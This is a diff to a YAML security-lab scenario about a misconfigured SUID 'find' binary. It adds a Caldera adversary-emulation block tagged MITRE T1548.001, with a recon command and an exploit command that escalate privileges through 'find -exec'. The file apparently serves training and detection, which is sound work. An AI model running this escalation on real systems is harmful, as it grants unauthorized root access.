@@ -17,3 +17,16 @@ suggested_fix: "chmod 755 /usr/bin/find"
 hints:
   - "Look for binaries with unusual permission bits"
   - "Check for SUID bits on common system utilities using: find / -perm -4000 -type f"
+caldera:
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.001
+    name: "Abuse Elevation Control Mechanism: Setuid and Setgid"
+  recon:
+    description: "Check if find binary has SUID bit set"
+    command: |
+      test -u /usr/bin/find && echo "VULNERABLE: SUID find detected" || echo "SECURE: find has normal permissions"
+  exploit:
+    description: "Escalate privileges via SUID find -exec"
+    command: |
+      /usr/bin/find /tmp -maxdepth 0 -exec whoami \;
